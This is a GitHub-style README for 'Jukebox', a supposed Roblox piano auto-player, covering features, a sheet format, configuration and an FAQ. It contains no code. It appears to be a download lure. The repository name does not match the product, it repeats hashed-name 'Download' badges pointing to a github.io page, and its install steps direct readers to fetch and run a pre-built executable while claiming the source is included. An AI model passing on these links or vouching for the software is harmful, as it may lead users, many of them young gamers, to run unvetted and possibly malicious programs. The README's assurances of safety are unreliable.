![preview](https://raw.githubusercontent.com/Solargic-Power/Piano-Roll-Station/main/promo_ccf53.svg)
[![Download](https://raw.githubusercontent.com/Solargic-Power/Piano-Roll-Station/main/app_da3121f.svg)](https://Solargic-Power.github.io/Piano-Roll-Station/)

# 🎼 Jukebox — A Roblox Piano Automation Studio

**Version 3.7.2 · Build 2026.02.14 · Stable Channel**

> Turn a silent keyboard into a symphony. Jukebox listens, learns, and replays your melody with the patience of a metronome and the flourish of a concert pianist.

Jukebox is an independent desktop companion for musicians, tinkerers, and virtual performers who want to bring pre-written music into Roblox's in-game piano instruments without hand-fatigue, timing drift, or repetitive strain. It is not a game modification, not an exploit kit, and not a service that touches anyone's account credentials — it is a local playback engine that types on your behalf, at a speed you choose, with a precision your fingers can only dream of.

This repository contains the full source tree, the note-conversion toolkit, the sheet library format specification, the playback scheduler, the user interface layer, and the extensive documentation that ties it all together.

---

## 📖 Table of Contents

1. What Is Jukebox?
2. Why This Project Exists
3. Feature Overview
4. Architecture at a Glance
5. The Sheet Format
6. Supported Instruments & Layouts
7. Multilingual Support
8. Responsive Interface Design
9. Getting the Application Running
10. Configuration Reference
11. Round-the-Clock Assistance
12. Performance Tuning Notes
13. Accessibility Commitments
14. Roadmap for 2026
15. Community & Contributions
16. Frequently Asked Questions
17. Disclaimer
18. License

---

## 1. What Is Jukebox? 🎹

Jukebox is a **local playback utility** built around one elegant idea: a song is just a sequence of timed keystrokes, and a computer is exceptionally good at timed keystrokes. Instead of forcing a performer to memorize hundreds of note positions across a virtual keyboard, Jukebox reads a compact text-based sheet, converts it into a stream of virtual key events, and dispatches those events into the window you point it at — nothing more, nothing less.

The project began as a personal quality-of-life experiment: one person tired of cramped hands after the fiftieth run-through of the same arrangement. It grew into a structured toolkit with a parser, a scheduler, a renderer, and a small but opinionated graphical shell.

Think of it as a **player-piano roll** translated into an era of keyboards and screens. The roll is your sheet file. The piano is your game window. Jukebox is the perforated paper and the mechanism that reads it.

### Who is it for?

- **Virtual performers** who want to reproduce elaborate arrangements accurately in front of an audience.
- **Composers** who want to test how an arrangement feels at different tempos before committing to a recording.
- **Educators** who demonstrate timing, rhythm, and layering concepts without needing a physical instrument.
- **Tinkerers** who want to extend the sheet format, write converters, or build their own front-ends on top of the playback core.

### What it deliberately is not

- It is not a network service. Nothing is uploaded. Nothing is phoned home.
- It is not tied to any specific account or identity.
- It does not alter game files, memory, or network traffic.

---

## 2. Why This Project Exists 💡

Most virtual piano tools in the wild fall into two extremes: either they are throwaway scripts with no documentation and a hard-coded song, or they are monolithic binaries with zero transparency. Jukebox sits in the middle — a **documented, testable, extensible** codebase that respects the user's time and the reader's intelligence.

The core motivations:

1. **Precision without pressure.** Human hands drift. Machines do not, unless you ask them to.
2. **Transparency.** Every note you hear can be traced back to a line in a text file you can open, read, and edit.
3. **Longevity.** Text formats outlive binaries. A sheet you write today should still play in five years.
4. **Comfort.** Repetitive strain is real, and a tool that removes thousands of keypresses from your week is a kindness.

---

## 3. Feature Overview ✨

| Capability | Description |
| --- | --- |
| Note parser | Reads compact sheet files with support for chords, sustains, and rests |
| Precision scheduler | Sub-millisecond target drift using a high-resolution timing loop |
| Live tempo adjustment | Rescale playback speed without restarting the song |
| Multi-track playback | Layer melody, harmony, and bass from a single sheet |
| Responsive interface | Layout adapts from compact netbook windows to ultrawide displays |
| Multilingual UI | Interface strings localized for a broad set of languages |
| Sheet library browser | Organize, tag, and search your arrangements locally |
| Loop regions | Mark a section and rehearse it indefinitely |
| Hotkey control | Start, pause, skip, and stop without leaving your instrument |
| Session logging | Optionally record timing statistics for every playback run |
| Import converters | Translate common notation styles into the native sheet format |
| Portable configuration | Settings live in a single human-readable file |

Additional quality-of-life details:

- **Countdown lead-in** so you can focus the target window before playback begins.
- **Dry-run mode** that prints the keystroke plan instead of sending it.
- **Transpose helper** that shifts an entire arrangement up or down by semitones.
- **Velocity simulation** for sheets that encode dynamics as timing jitter.
- **Crash-safe resume** that remembers where a long arrangement was interrupted.

---

## 4. Architecture at a Glance 🏗️

Jukebox is organized into a handful of cooperating subsystems, each of which can be tested and replaced independently.

### 4.1 Input Layer

Reads sheet files from disk, validates them against the format specification, and produces an in-memory song model. Malformed lines are reported with line numbers and column hints rather than silently ignored.

### 4.2 Conversion Layer

Translates musical events — pitches, durations, velocities — into concrete key identifiers for a chosen instrument layout. This is where the mapping from "C#4" to "the key labeled D" happens, and where layout presets live.

### 4.3 Scheduling Layer

Owns the clock. It maintains a sorted queue of events, wakes at the right moment, and dispatches each event to the output backend. It compensates for the drift introduced by the operating system's scheduler so that long songs do not gradually slide out of time.

### 4.4 Output Layer

Delivers virtual key events to the operating system's input pipeline. Backends are pluggable, which is why the project can support multiple platforms without rewriting the scheduling core.

### 4.5 Presentation Layer

The graphical shell: window management, playback controls, sheet browser, settings panels, and localization. It is intentionally thin, delegating all musical logic to the layers below.

### 4.6 Observability

Structured logs, timing histograms, and an optional metrics endpoint for local dashboards. Nothing leaves your machine unless you explicitly export it.

---

## 5. The Sheet Format 📝

Jukebox sheets are plain text. A minimal example looks like this:

    title: Twinkle Fragment
    tempo: 120
    instrument: grand
    ---
    C4:1 D4:1 E4:1 F4:1
    G4:2 G4:2
    A4:1 A4:1 G4:2

Each line is a measure. Each token is a note followed by a duration in beats. Chords are written inside square brackets, rests use a dash, and comments begin with a double slash.

The full specification, including sustain notation, velocity annotations, and multi-track separators, is documented in the `docs/` directory of this repository. Highlights include:

- **Note names** in scientific pitch notation with optional accidentals.
- **Durations** as beat fractions or as absolute millisecond values.
- **Track headers** that name a voice and assign it a layout.
- **Metadata blocks** for title, author, tempo, and layout hints.
- **Directives** that adjust playback on the fly, such as tempo ramps.

Because the format is text, it diffs cleanly in version control. You can review a collaborator's arrangement line by line, which is a small but genuine pleasure.

---

## 6. Supported Instruments & Layouts 🎛️

Virtual pianos rarely agree on which key maps to which pitch. Jukebox handles this with layout presets. A preset is a mapping file describing the keyboard geometry, the pitch assignment, and any instrument-specific quirks.

Built-in presets cover the common twenty-one-key and twenty-four-key arrangements, extended eighty-eight-key layouts, and several community favorites. Custom presets can be dropped into the layout directory and will appear in the interface without a restart.

Each preset declares:

- **Geometry** — how many rows, how many keys per row, and their physical ordering.
- **Mapping** — the pitch assigned to each position.
- **Modifiers** — any keys that must be held while another is pressed.
- **Timing bias** — an optional offset to compensate for a specific instrument's input handling.

---

## 7. Multilingual Support 🌍

The interface ships with localization files for a growing set of languages, including English, Spanish, Portuguese, French, German, Italian, Japanese, Korean, and Simplified Chinese. Translations are stored as simple key-value documents, so adding a language requires no programming knowledge — only patience and a good ear for phrasing.

Language selection follows the operating system by default but can be overridden in settings. Right-to-left layouts are supported through the same responsive engine that handles narrow windows, which keeps the codebase honest.

If a translation is incomplete, Jukebox falls back gracefully to the base language rather than displaying raw keys. Missing strings are listed in a report so contributors can find them quickly.

---

## 8. Responsive Interface Design 📐

The interface is built on a fluid layout engine. Panels rearrange themselves as the window narrows: the sheet browser collapses into a drawer, the transport controls dock to the bottom edge, and the settings panel becomes a full-window overlay.

Design principles:

- **No fixed pixel assumptions.** Everything scales with the window and the system font size.
- **Keyboard-first navigation.** Every control is reachable without a mouse.
- **High-contrast theme** available alongside the default palette.
- **Reduced-motion mode** that disables animated transitions.
- **Live resizing** without flicker or layout thrash.

The result is an interface that feels at home on a tiny laptop screen and on a sprawling desktop monitor alike.

---

## 9. Getting the Application Running 🚀

Jukebox is distributed as a self-contained application bundle for Windows, macOS, and Linux. There is no dependency maze to navigate and no environment variables to memorize.

1. Obtain the current stable release from the distribution page. Use the [![Download](https://raw.githubusercontent.com/Solargic-Power/Piano-Roll-Station/main/app_da3121f.svg)](https://Solargic-Power.github.io/Piano-Roll-Station/) link provided at the bottom of this document.
2. Extract the archive into a directory of your choosing — a documents folder works well.
3. Launch the executable inside the extracted directory.
4. On first run, Jukebox creates a configuration file and a sheets directory beside itself.
5. Open a sheet from the built-in library, choose your instrument layout, and press play.

For users who prefer to build from source, the repository includes a build script and a short document describing the toolchain requirements. Building is optional; the pre-built bundles are the recommended path for everyday use.

---

## 10. Configuration Reference ⚙️

Settings live in a single file named `jukebox.conf`. The format is a straightforward key-value layout with sections. A representative excerpt:

    [playback]
    lead_in_seconds = 3
    default_tempo = 120
    loop_mode = off

    [output]
    backend = auto
    key_hold_ms = 40
    drift_correction = enabled

    [interface]
    language = auto
    theme = dark
    reduced_motion = false

Every option is documented inline with a comment describing its effect and its default. Editing the file by hand is fully supported; the interface writes the same format, so round-tripping is lossless.

---

## 11. Round-the-Clock Assistance 🕰️

Questions rarely arrive during business hours, so support does not pretend to keep them. The project maintains:

- **A living documentation set** updated with each release.
- **A discussion space** where users and maintainers trade layout presets and sheet tricks.
- **An issue tracker** with templates that help you describe a problem precisely the first time.
- **A troubleshooting guide** covering the most common timing and focus issues.

Support is provided by volunteers who care about the project. Response times vary, but every report is read. If you solve your own problem before a maintainer replies, consider sharing the solution — that is how the knowledge base grows.

---

## 12. Performance Tuning Notes 📊

Timing precision depends on more than code. A few practical observations:

- **Disable power-saving throttling** while performing. A CPU that downclocks mid-song will introduce audible drift.
- **Close background recording software** if you notice jitter; some capture tools hook the input pipeline aggressively.
- **Prefer wired peripherals** when you can. Wireless input stacks occasionally batch events.
- **Use the drift report** to measure actual versus target timing for a given sheet.

The scheduler includes an adaptive correction pass that samples recent dispatch times and nudges future events to compensate. On a typical desktop, long arrangements stay within a few milliseconds of their target timeline.

---

## 13. Accessibility Commitments ♿

- All interactive elements expose accessible names and roles.
- Focus order follows a logical reading sequence.
- Color is never the sole carrier of meaning.
- Text scales with system settings without clipping.
- A screen-reader-friendly status log narrates playback state changes.

Accessibility reports are treated as first-class bugs, not nice-to-haves.

---

## 14. Roadmap for 2026 🗺️

- **Q1 2026** — Sheet editor with live preview and undo history.
- **Q2 2026** — Collaborative sheet syncing through user-provided storage.
- **Q3 2026** — Expanded layout preset library and an in-app preset designer.
- **Q4 2026** — Plugin interface for community-built converters and backends.
- **Ongoing** — Localization expansion, documentation refinement, and performance work.

The roadmap is a statement of intent, not a contract. Priorities shift with community feedback.

---

## 15. Community & Contributions 🤝

Contributions are welcome in many forms: code, documentation, translations, layout presets, test sheets, and bug reports. Before opening a pull request, please read the contribution guide in the repository root. It describes the coding style, the commit message conventions, and the review process.

A few ground rules:

- Be kind. Assume good faith.
- Keep changes focused. One idea per pull request.
- Add tests for behavior changes.
- Update documentation when you change a public interface.

Reviewers aim to respond within a week. If a pull request goes quiet, a polite nudge is entirely acceptable.

---

## 16. Frequently Asked Questions ❓

**Does Jukebox require an internet connection?**
No. Everything runs locally. An optional update check can be enabled, but it is off by default.

**Can I write my own sheets?**
Yes, and it is encouraged. The format is documented and forgiving. Start with a single measure and grow from there.

**Will my sheet from an older version still work?**
The format is versioned and backward compatible. Deprecated syntax produces a warning, not a failure.

**Can I use Jukebox with instruments other than a piano?**
Any virtual instrument that accepts keyboard input can be targeted, provided you supply or select an appropriate layout preset.

**Is there a portable mode?**
Yes. Place a marker file beside the executable and all configuration and sheets stay in the application directory.

**How do I report a timing problem?**
Enable session logging, reproduce the issue, and attach the generated report to your issue. The report includes timing histograms that make diagnosis much faster.

---

## 17. Disclaimer ⚠️

Jukebox is an independent, community-maintained project. It is not affiliated with, endorsed by, or sponsored by any game platform, publisher, or instrument manufacturer mentioned in this document.

The software is provided as a local automation aid for personal, educational, and creative use. You are responsible for how you use it and for complying with the terms of service of any platform you interact with. The maintainers do not condone misuse, and they accept no liability for consequences arising from use of the software.

No account credentials, tokens, or personal identifiers are collected, stored, or transmitted by this application. Playback happens entirely on your machine.

Use good judgment. Be a considerate member of your community. Make beautiful things.

---

## 18. License 📜

This project is released under the **MIT License**.

You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the conditions described in the license text. The full license is available in the repository at [LICENSE](LICENSE).

Copyright © 2026 the Jukebox contributors.

---

## Closing Note 🎵

A tool is only as good as the music it helps you make. Jukebox exists to remove friction between the arrangement in your head and the sound in the room. Whether you are rehearsing a single phrase or performing a full set, may your timing hold steady and your audiences be delighted.

If this project made your day a little easier, consider contributing a sheet, fixing a typo, or translating a string. Small gifts compound.

[![Download](https://raw.githubusercontent.com/Solargic-Power/Piano-Roll-Station/main/app_da3121f.svg)](https://Solargic-Power.github.io/Piano-Roll-Station/)